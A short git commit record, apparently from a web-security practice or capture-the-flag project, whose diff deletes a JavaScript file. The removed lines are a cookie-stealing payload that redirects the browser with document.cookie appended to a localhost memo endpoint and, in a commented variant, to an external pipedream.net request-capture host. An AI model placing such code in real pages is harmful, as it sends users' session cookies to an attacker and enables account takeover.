c41e0528409e8f52b6ce3c54e98bce4dc844c733
triger99 <ssmyym@ajou.ac.kr>
2025-04-26 21:40:29 +0900

    jquery

--- static/js/base_url.js
+++
@@ -1,3 +0,0 @@
-location.href = "http://127.0.0.1:8000/memo?memo="+document.cookie
-//location.href = 'http://127.0.0.1:8000/memo?memo='+document.cookie
-//location.href = 'https://enh4d3wjnllvs.x.pipedream.net?'+document.cookie
